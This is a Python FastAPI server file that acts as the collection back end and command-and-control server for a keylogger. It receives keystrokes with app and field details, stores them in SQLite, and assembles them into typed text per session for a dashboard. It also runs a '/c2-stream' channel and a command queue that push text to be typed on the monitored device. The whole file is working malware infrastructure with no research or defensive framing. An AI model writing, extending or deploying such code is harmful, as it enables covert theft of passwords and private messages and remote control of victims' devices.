# main.py - FastAPI server with Malaysia Time (UTC+8)
from typing import Dict
import sqlite3
from datetime import datetime, timezone, timedelta
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import asyncio
from fastapi.responses import StreamingResponse

from tj import app as tj_router

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.include_router(tj_router, prefix="/tj")

templates = Jinja2Templates(directory="templates")
DB_FILE = "keystrokes.db"

MY_TIMEZONE = timezone(timedelta(hours=8))

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            key_val TEXT,
            app_name TEXT,
            app_id TEXT,
            field_hint TEXT,
            field_name TEXT,
            field_id INTEGER,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

class KeystrokeData(BaseModel):
    session_id: str
    key: str
    app_name: str
    app_id: str
    field_hint: str
    field_name: str
    field_id: int

PENDING_COMMANDS = []

async def event_generator():
    while True:
        if PENDING_COMMANDS:
            text = PENDING_COMMANDS.pop(0)
            yield f"data: {text}\n\n"
        await asyncio.sleep(0.2)

@app.get("/c2-stream")
async def c2_stream():
    return StreamingResponse(event_generator(), media_type="text/event-stream")

@app.post("/queue-command")
async def queue_command(data: dict):
    text_to_type = data.get("text")
    if text_to_type:
        PENDING_COMMANDS.append(text_to_type)
        return {"status": "success", "message": f"Queued: {text_to_type}"}
    return {"status": "error", "message": "No text provided"}

@app.get("/get-command")
def get_command():
    if PENDING_COMMANDS:
        text_to_inject = PENDING_COMMANDS.pop(0)
        return {"status": "success", "command": "type", "text": text_to_inject}
    return {"status": "success", "command": "none"}

@app.post("/keylogger")
async def log_keystroke(data: Dict):
    try:
        recv_data = {
            'session_id': data.get('session_id'),
            'key': data.get('key'),
            'app_name': data.get('app_name'),
            'app_id': data.get('app_id'),
            'field_hint': data.get('field_hint'),
            'field_name': data.get('field_name'),
            'field_id': data.get('field_id'),
        }

        malaysia_time = datetime.now(MY_TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")

        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO keystrokes (session_id, key_val, app_name, app_id, field_hint, field_name, field_id, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            recv_data['session_id'],
            recv_data['key'],
            recv_data['app_name'],
            recv_data['app_id'],
            recv_data['field_hint'],
            recv_data['field_name'],
            recv_data['field_id'],
            malaysia_time
        ))
        conn.commit()
        conn.close()

        print(f"[{malaysia_time}] Stored keystroke: {recv_data}")
        return {"status": "success", "message": "Keystroke logged and saved with MYT timestamp"}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/logs")
async def get_logs():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("""
        SELECT 
            session_id,
            app_name,
            app_id,
            field_hint,
            field_name,
            MAX(timestamp) as timestamp,
            GROUP_CONCAT(key_val, '') as grouped_keys,
            COUNT(*) as key_count
        FROM keystrokes 
        GROUP BY session_id, app_id, field_id, field_hint
        ORDER BY timestamp DESC 
        LIMIT 100
    """)
    rows = cursor.fetchall()
    conn.close()
    
    return {"status": "success", "data": [dict(row) for row in rows]}

@app.delete("/logs/{session_id}")
async def delete_session_logs(session_id: str):
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM keystrokes WHERE session_id = ?", (session_id,))
        conn.commit()
        conn.close()
        return {"status": "success", "message": f"Session {session_id} deleted successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/dashboard", response_class=HTMLResponse)
async def serve_dashboard(request: Request):
    return templates.TemplateResponse(request, "dashboard.html")

@app.get("/")
async def root():
    return {"message": "Keylogger Server with Malaysia Time (MYT) is running."}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=3000, reload=True, workers=1)
